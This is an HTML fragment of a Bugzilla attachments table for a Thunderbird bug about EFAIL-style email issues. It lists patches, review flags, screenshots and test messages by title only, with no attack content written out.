    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976054">Sanitize quoted HTML (cleaned-up)</a>
        </div>
        <div>
            <a href="#c61" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 00:31 PDT" data-time="1526455875">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.76 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c61"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526455875"
            >
              feedback-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976054&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976054&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976054">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976074">Separate MIME parts from each other (for 52)</a>
        </div>
        <div>
            <a href="#c69" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 03:31 PDT" data-time="1526466716">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.17 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976074&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976074&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976085">Sanitizer code cleanup</a>
        </div>
        <div>
            <a href="#c71" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 04:29 PDT" data-time="1526470174">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">13.72 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_101158" ><span class="fn">mkmelin</span>
</div>:
              <a href="#c78"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526470174"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c75"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526484271"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976085&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976085&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976086">Sanitize quoted HTML, v3</a>
        </div>
        <div>
            <a href="#c72" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 04:31 PDT" data-time="1526470263">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.60 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976086&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976086&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976086">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976330">Separate MIME parts from each other (for trunk)</a>
        </div>
        <div>
            <a href="#c79" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 14:00 PDT" data-time="1526504405">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.55 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976330&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976330&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976330">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976349">Separate MIME parts from each other, v4 (trunk and 52)</a>
        </div>
        <div>
            <a href="#c87" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 15:21 PDT" data-time="1526509307">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">14.37 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976349&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976349&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976351">Sanitizer code cleanup, v2</a>
        </div>
        <div>
            <a href="#c88" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 15:26 PDT" data-time="1526509594">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">14.78 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c104"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526559532"
            >
              review-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976351&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976351&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976363">Sanitize quotes, v4 (for 52)</a>
        </div>
        <div>
            <a href="#c92" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 16:00 PDT" data-time="1526511610">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">4.66 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c105"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526559703"
            >
              feedback-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976363&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976363&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976377"
              title="Sanitize quotes, v2 vs. v4 - Screenshots"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">Sanitize quotes, v2 vs. v4 - Screenshots
            </a>
        </div>
        <div>
            <a href="#c97" class="attach-time activity-ref"><span class="rel-time" title="2018-05-16 17:01 PDT" data-time="1526515277">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">262.53 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976377&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976703"
              title="tb-efail-attachment-separators.png"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">tb-efail-attachment-separators.png
            </a>
        </div>
        <div>
            <a href="#c118" class="attach-time activity-ref"><span class="rel-time" title="2018-05-17 14:18 PDT" data-time="1526591899">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">49.05 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976703&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976711"
              title="horizontal lines.png"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">horizontal lines.png
            </a>
        </div>
        <div>
            <a href="#c120" class="attach-time activity-ref"><span class="rel-time" title="2018-05-17 14:32 PDT" data-time="1526592776">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">10.32 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976711&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8977051"
              title="DOM.png"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">DOM.png
            </a>
        </div>
        <div>
            <a href="#c133" class="attach-time activity-ref"><span class="rel-time" title="2018-05-18 09:12 PDT" data-time="1526659937">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_282357" ><a class="email " href="/user_profile?user_id=282357" > <span class="fna">Richard Marti (:Paenglab)</span></a>
</div></span>
        </div>
        <div class="attach-info">20.94 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8977051&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979059">Separate MIME parts from each other, v4 (trunk only, with clean-up)</a>
        </div>
        <div>
            <a href="#c145" class="attach-time activity-ref"><span class="rel-time" title="2018-05-19 15:15 PDT" data-time="1526768132">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">14.00 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_101158" ><span class="fn">mkmelin</span>
</div>:
              <a href="#c150"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526768132"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c146"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526773265"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979059&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979059&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979060">1419417-fix-tests.patch</a>
        </div>
        <div>
            <a href="#c147" class="attach-time activity-ref"><span class="rel-time" title="2018-05-19 16:43 PDT" data-time="1526773418">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">4.44 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979060&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979060&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979060">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979061">1419417-fix-tests.patch (v2)</a>
        </div>
        <div>
            <a href="#c148" class="attach-time activity-ref"><span class="rel-time" title="2018-05-19 16:58 PDT" data-time="1526774335">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">4.54 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979061&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979061&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979062">1419417-remove-monkey-patch.patch</a>
        </div>
        <div>
            <a href="#c149" class="attach-time activity-ref"><span class="rel-time" title="2018-05-19 17:20 PDT" data-time="1526775652">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.06 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_101158" ><span class="fn">mkmelin</span>
</div>:
              <a href="#a15572834_101158"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526775652"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979062&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979062&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979062">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979120">Separate MIME parts from each other, v4b (trunk only, with clean-up)</a>
        </div>
        <div>
            <a href="#c153" class="attach-time activity-ref"><span class="rel-time" title="2018-05-20 14:21 PDT" data-time="1526851272">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">14.00 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#a15646030_176914"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526920921"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#a15756451_176914"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1527031342"
            >
              approval-comm-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#a15756451_176914"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1527031342"
            >
              approval-comm-esr52+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#a15756451_176914"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1527031342"
            >
              approval-comm-esr60+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979120&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979120&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979120">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979122">1419417-fix-tests.patch (v2)</a>
        </div>
        <div>
            <a href="#c155" class="attach-time activity-ref"><span class="rel-time" title="2018-05-20 14:25 PDT" data-time="1526851536">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.63 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_22599" ><span class="fn">BenB</span>
</div>:
              <a href="#c170"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526898533"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979122&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979122&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979123">1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]</a>
        </div>
        <div>
            <a href="#c156" class="attach-time activity-ref"><span class="rel-time" title="2018-05-20 14:30 PDT" data-time="1526851803">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.87 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c157"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526851803"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979123&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979123&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979183">Separate MIME parts from each other, v5 (for 52)</a>
        </div>
        <div>
            <a href="#c162" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 02:25 PDT" data-time="1526894712">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.92 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979183&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979183&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979183">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979187">Separate MIME parts from each other, v5 (for trunk)</a>
        </div>
        <div>
            <a href="#c163" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 02:51 PDT" data-time="1526896271">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.68 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979187&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979187&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979187">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979190">Separate MIME parts from each other, v5.1 (for trunk)</a>
        </div>
        <div>
            <a href="#c164" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 03:15 PDT" data-time="1526897728">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.28 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c189"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526914028"
            >
              review-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979190&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979190&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979192">Separate MIME parts from each other, v5.1 (for 52)</a>
        </div>
        <div>
            <a href="#c165" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 03:22 PDT" data-time="1526898162">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">15.33 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979192&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979192&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979192">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979211">1419417-fix-tests.patch (v3)</a>
        </div>
        <div>
            <a href="#c179" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 05:27 PDT" data-time="1526905645">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.63 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979211&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979211&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979211">Splinter Review</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979245"
              title="&lt;div&gt; is correctly wrapping the HTMl email, with patch v5.*"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">&lt;div&gt; is correctly wrapping the HTMl email, with patch v5.*
            </a>
        </div>
        <div>
            <a href="#c185" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 07:14 PDT" data-time="1526912046">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">11.76 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979245&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979258">test with image for attaching bug.eml</a>
        </div>
        <div>
            <a href="#c188" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 07:45 PDT" data-time="1526913939">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.84 KB,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979258&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979995">OpenPGP Signature Spoofing</a>
        </div>
        <div>
            <a href="#c200" class="attach-time activity-ref"><span class="rel-time" title="2018-05-23 09:54 PDT" data-time="1527094456">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">3.59 KB,
          message/rfc822        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979995&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979996"
              title="OpenPGP Signature Spoofing (Screenshot)"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">OpenPGP Signature Spoofing (Screenshot)
            </a>
        </div>
        <div>
            <a href="#c201" class="attach-time activity-ref"><span class="rel-time" title="2018-05-23 09:54 PDT" data-time="1527094490">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">42.35 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979996&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979997">S/MIME Reply Exfiltration</a>
        </div>
        <div>
            <a href="#c202" class="attach-time activity-ref"><span class="rel-time" title="2018-05-23 09:55 PDT" data-time="1527094524">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">1.37 KB,
          message/rfc822        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979997&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979998"
              title="S/MIME Reply Exfiltration (Screenshot)"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">S/MIME Reply Exfiltration (Screenshot)
            </a>
        </div>
        <div>
            <a href="#c203" class="attach-time activity-ref"><span class="rel-time" title="2018-05-23 09:55 PDT" data-time="1527094547">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">60.26 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979998&amp;action=edit">Details</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt">
  init_module_visibility();
</script>



